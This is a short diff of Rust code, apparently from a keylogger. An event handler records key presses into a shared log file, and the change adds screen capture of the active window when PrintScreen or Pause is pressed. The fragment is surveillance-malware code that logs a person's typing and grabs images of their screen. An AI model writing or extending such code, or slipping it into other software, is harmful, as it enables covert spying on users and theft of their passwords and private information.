@@ -136,7 +136,16 @@ fn track(event: Event) {
         EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
         EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
         EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
-        EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
+        EventType::KeyPress(Key::Pause | Key::PrintScreen) => {
+            match get_active_window() {
+                Ok(active_window) => {
+                    capture_screen(active_window);
+                },
+                Err(()) => {
+                    println!("error occurred while getting the active window");
+                }
+            }
+        },
         EventType::KeyPress(Key::Slash) => {
             *LOG_FILE.lock().unwrap() += "/";
             *LOGGED.lock().unwrap() = false;
